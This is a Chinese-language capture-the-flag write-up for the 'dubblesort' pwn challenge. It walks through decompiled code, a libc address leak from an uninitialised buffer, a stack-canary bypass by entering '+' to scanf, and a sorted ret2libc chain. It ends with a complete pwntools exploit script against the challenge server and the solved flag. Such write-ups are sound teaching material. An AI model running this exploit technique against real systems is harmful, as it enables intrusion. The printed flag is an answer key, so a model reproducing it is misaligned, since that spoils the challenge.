# dubblesort

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=39295174-778f-4311-9424-465311ccc228_2)

猛然发现自己根本就没有独立做出来几道pwn题过。

这次的checksec开局提升震慑效果。

-   Arch:     i386-32-little
    <br>RELRO:    Full RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <br>PIE:      PIE enabled
    <br>FORTIFY:  Enabled

保护全开，不妙啊。

```c
undefined4 main(void)
{
  undefined4 uVar1;
  uint uVar2;
  uint *puVar3;
  int in_GS_OFFSET;
  uint local_78;
  uint local_74 [8];
  undefined local_54 [64];
  int local_14;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  FUN_000108b5();
  __printf_chk(1,"What your name :");
  read(0,local_54,64);
  __printf_chk(1,"Hello %s,How many numbers do you what to sort :",local_54);
  __isoc99_scanf(&format,&local_78);
  if (local_78 != 0) {
    puVar3 = local_74;
    uVar2 = 0;
    do {
      __printf_chk(1,"Enter the %d number : ",uVar2);
      fflush(*(FILE **)PTR_stdout_00011ff0);
      __isoc99_scanf(&format,puVar3);
      uVar2 = uVar2 + 1;
      puVar3 = puVar3 + 1;
    } while (uVar2 < local_78);
  }
  Process(local_74,local_78);
  puts("Result :");
  if (local_78 != 0) {
    uVar2 = 0;
    do {
      __printf_chk(1,&DAT_00010c1d,local_74[uVar2]);
      uVar2 = uVar2 + 1;
    } while (uVar2 < local_78);
  }
  uVar1 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar1 = CanaryFailed();
  }
  return uVar1;
}
```

我发现当程序出现没什么用的功能时那个地方就有知识点。比如这里提示我们输入名字，可是这个名字基本上没用。[wp](https://blog.csdn.net/seaaseesa/article/details/103131391)提示此处的知识点是read在接收输入到local_54之前没有将local_54清空，那么里面可能会有残留数据。这点我没想明白为啥这题会有，其他的题就好好的，关键残留的数据正好是libc的加载地址。gdb调试可以得到里面残留的数据,在__printf_chk设个断点，执行到read下面那个__printf_chk时输入命令检查。

- (gdb) x/64u $ebp-0x5c
<br>0xffe9dc6c:     10      221     233     255     0       0       0       0
<br>0xffe9dc74:     0       0       0       0       0       0       0       1
<br>0xffe9dc7c:     9       0       0       0       64      69      246     247
<br>0xffe9dc84:     0       0       0       0       190     228     210     247
<br>0xffe9dc8c:     84      0       244     247     160     228     245     247
<br>0xffe9dc94:     128     111     247     247     190     228     210     247
<br>0xffe9dc9c:     160     228     245     247     224     220     233     255
<br>0xffe9dca4:     108     230     245     247     64      235     245     247

我只输入了一个回车，也就是最开始的10。发现这里面满满当当，0xffe9dc84到0xffe9dc8c的0之前的数据就是libc的当前加载地址。如果我们输入28个字符，那prinf的时候就会带着这些数据一起打印出来，直到0结束。libc加载偏移就可以直接通过这次静态调试出来了，因为给了libc，可以直接找出libc的基地址然后两者相减。当然动态也是可以的。

接着就是寻找关键漏洞点了。我之前一直想着数字类型变量无法溢出，忽略这题的变化。数字没法溢出仅限于单次输入，这次是循环输入到puVar3这个地址，每输入一个数字地址自增1，那只要算好这个地址，是可以构成rop链的。还没有结束，意识到可以rop还不够，canary怎么绕过？process函数中还对我们输入的内容做了改变。

```c
void Process(uint *param_1,int param_2)
{
  int iVar1;
  uint uVar2;
  uint *puVar3;
  int iVar4;
  uint *puVar5;
  int in_GS_OFFSET;
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  puts("Processing......");
  sleep(1);
  if (param_2 == 1) {
LAB_000109a9:
    if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
      CanaryFailed();
    }
    return;
  }
  iVar4 = param_2 + -2;
  puVar5 = param_1 + param_2 + -1;
  do {
    puVar3 = param_1;
    if (iVar4 != -1) {
      do {
        uVar2 = *puVar3;
        if (puVar3[1] < uVar2) {
          *puVar3 = puVar3[1];
          puVar3[1] = uVar2;
        }
        puVar3 = puVar3 + 1;
      } while (puVar5 != puVar3);
      if (iVar4 == 0) goto LAB_000109a9;
    }
    iVar4 = iVar4 + -1;
    puVar5 = puVar5 + -1;
  } while( true );
}
```

这个函数的功能是会把我们输入的数字按照从小到大的顺序进行排序后输出。我们期望的顺序是无用数据-canary-ebp-system_addr-bin_sh_addr，那么必须满足无用数据<canary<ebp<system_addr<bin_sh_addr。

system和binsh好办，system总是小于binsh。ebp随便填，比system小就行了，或者直接无脑填system，怎么排序都对。无用数据填0，怎么着都比剩下的小。就是这个canary有点麻烦，每次运行都是随机的，所以只能碰运气了,一般都是比system小的。那么只剩下最后一个问题：canary怎么绕过？

程序中接收输入的代码为__isoc99_scanf(&format,puVar3);，其中format内容为%u，也就是无符号整数。%u从C99标准之后，我们能够选择输入符号，如果符号为负数，将不会抛出错误，并且将会变成对应补码。如果只传入符号+或者-，原有的数据不会改变。意味着当我们输入到canary的位置时，输入+或者-，canary将会保持原值。计算偏移请看上面的wp，ghidra里面看不到输入的数字的位置，只能看见canary的。

```python
from pwn import *
p=remote("61.147.171.105",58675)
base_offset=0x1AE244
bin_sh_offset=0x0015902b
system_offset=239936
payload = b'a'*0x1C  
p.sendafter('name :',payload)  
p.recvuntil(payload)
libc_base = u32(p.recv(4)) - base_offset
system_addr=libc_base+system_offset
binsh_addr=libc_base+bin_sh_offset
n = 35  
p.sendlineafter('sort :',str(n))  
for i in range(0,n-11):  
   p.sendlineafter('number :',str(0))  
p.sendlineafter('number :','+')  
for i in range(0,9):  
   p.sendlineafter('number :',str(system_addr))  
p.sendlineafter('number :',str(binsh_addr))  
p.interactive()
```

- ### Flag
  > cyberpeace{5e637dfbd6ab1ed0915fbe60499f40e9}